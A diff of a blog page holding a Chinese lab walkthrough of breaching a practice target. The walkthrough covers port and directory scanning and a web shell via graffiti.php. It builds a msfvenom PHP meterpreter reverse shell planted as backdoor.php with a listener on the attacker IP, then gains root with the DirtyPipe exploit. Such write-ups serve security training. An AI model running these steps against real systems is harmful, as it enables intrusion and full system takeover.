@@ -203,14 +203,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/Writeup/" style="color: #ffa2c4">
+                <a href="/tags/Writeup/" style="color: #00bcd4">
                     Writeup
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #00bcd4">
+                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #03a9f4">
                     网安
                 </a>
             </span>
@@ -224,7 +224,7 @@
 <span id="more"></span>
 
 <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>惯例先nmap扫主机ip和端口</p>
-<pre><code class="bash">nmap 192.168.23.0/24
+<pre><code class="language-bash">nmap 192.168.23.0/24
 </code></pre>
 <p><img src="image-20250402172749385.png" alt="image-20250402172749385"></p>
 <p>三个端口开放， ip是192.168.23.163</p>
@@ -234,14 +234,14 @@
 <p><img src="image-20250402172856687.png" alt="image-20250402172856687"></p>
 <p>81端口要登录，不知道用户名密码，放弃，还看80端口。</p>
 <p>扫一下目录</p>
-<pre><code class="bash">dirb http://192.168.23.163/ -X .txt,.php
+<pre><code class="language-bash">dirb http://192.168.23.163/ -X .txt,.php
 </code></pre>
 <p><img src="image-20250402173035179.png" alt="image-20250402173035179"></p>
 <p>只有一个robots.txt，看看</p>
 <p><img src="image-20250402173102249.png" alt="image-20250402173102249"></p>
 <p>没什么有用的信息。</p>
 <p>换一个目录扫描工具，找个更大的字典再扫一遍</p>
-<pre><code class="bash">gobuster dir -u http://192.168.23.163/ -x .txt,.php -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+<pre><code class="language-bash">gobuster dir -u http://192.168.23.163/ -x .txt,.php -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 </code></pre>
 <p><img src="image-20250402173231489.png" alt="image-20250402173231489"></p>
 <p>找到了graffiti.php和graffiti.txt，访问graffiti.php看看是什么</p>
@@ -259,12 +259,12 @@
 <p>然后send，用蚁剑连一下。</p>
 <p><img src="image-20250402173908643.png" alt="image-20250402173908643"></p>
 <p>msfvenom写个反弹shell</p>
-<pre><code class="bash">msfvenom -p php/meterpreter/reverse_tcp
+<pre><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp
 </code></pre>
 <p>一般默认即可，ip就是你的攻击机ip，端口默认4444。把生成的反弹shell挂到backdoor.php上去</p>
 <p><img src="image-20250402174105719.png" alt="image-20250402174105719"></p>
 <p>msfconsole准备监听</p>
-<pre><code class="bash">msfconsole
+<pre><code class="language-bash">msfconsole
 use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
 set LHOST 192.168.23.159
@@ -274,26 +274,26 @@ run
 <p>访问靶机上挂了反弹shell的php，也就是<a target="_blank" rel="noopener" href="http://192.168.23.163/backdoor.php">http://192.168.23.163/backdoor.php</a></p>
 <p><img src="image-20250402174312159.png" alt="image-20250402174312159"></p>
 <p>监听成功，写个交互，然后看一下内核版本</p>
-<pre><code class="bash">ls /boot
+<pre><code class="language-bash">ls /boot
 </code></pre>
 <p><img src="image-20250402174405468.png" alt="image-20250402174405468"></p>
 <p>linux 5.10内核，找个PoC跑一下</p>
-<pre><code class="bash">searchsploit linux 5.10
+<pre><code class="language-bash">searchsploit linux 5.10
 # Linux Kernel 5.8 &lt; 5.16.11 - Local Privilege Escalation (DirtyPipe)                   | linux/local/50808.c
 searchsploit -m linux/local/50808.c
 gcc 50808.c -o 50808 -static
 </code></pre>
 <p>编译好后在蚁剑那边传上去</p>
 <p>然后赋一个可执行权限</p>
-<pre><code class="bash">chmod +x 50808
+<pre><code class="language-bash">chmod +x 50808
 </code></pre>
 <p>PoC需要一个具有 SUID 权限的文件才能提取。找一下有没有</p>
-<pre><code class="bash">find / -perm -u=s -type f 2&gt;/dev/null
+<pre><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
 </code></pre>
 <p><img src="image-20250402174738541.png" alt="image-20250402174738541"></p>
 <p>有的兄弟，有的</p>
 <p>那就随便找一个作为参数</p>
-<pre><code class="bash">./50808 /usr/bin/su
+<pre><code class="language-bash">./50808 /usr/bin/su
 </code></pre>
 <p><img src="image-20250402174820598.png" alt="image-20250402174820598"></p>
 <p>成功提权</p>
